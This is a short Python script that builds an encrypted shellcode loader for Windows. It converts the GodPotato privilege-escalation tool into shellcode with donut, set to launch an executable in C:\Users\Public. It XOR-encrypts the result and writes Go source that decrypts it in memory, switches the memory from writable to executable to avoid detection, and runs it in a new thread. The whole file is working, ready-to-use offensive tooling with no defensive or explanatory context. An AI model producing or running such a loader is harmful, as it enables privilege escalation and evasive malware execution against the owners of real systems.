# loader.py — generates XOR-encrypted shellcode loader
import donut, secrets

shellcode  = donut.create(file="GodPotato.exe", params=r'-cmd C:\Users\Public\s.exe')
key        = secrets.token_bytes(32)
encrypted  = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

def to_go_bytes(data, name):
    lines = [f"var {name} = []byte{{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("}")
    return "\n".join(lines)

go_code = f'''package main
import ("syscall"; "unsafe")
{to_go_bytes(key, "key")}
{to_go_bytes(encrypted, "enc")}
func main() {{
    sc := make([]byte, len(enc))
    for i := range enc {{ sc[i] = enc[i] ^ key[i%len(key)] }}
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    vAlloc := kernel32.NewProc("VirtualAlloc")
    addr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)  // RW, not RWX
    for i, b := range sc {{ *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }}
    var old uint32
    vProt := kernel32.NewProc("VirtualProtect")
    vProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))  // RX
    t, _, _ := kernel32.NewProc("CreateThread").Call(0, 0, addr, 0, 0, 0)
    kernel32.NewProc("WaitForSingleObject").Call(t, 0xFFFFFFFF)
}}
'''
open("loader.go", "w").write(go_code)
print(f"[+] generated loader.go ({len(shellcode)} bytes shellcode)")
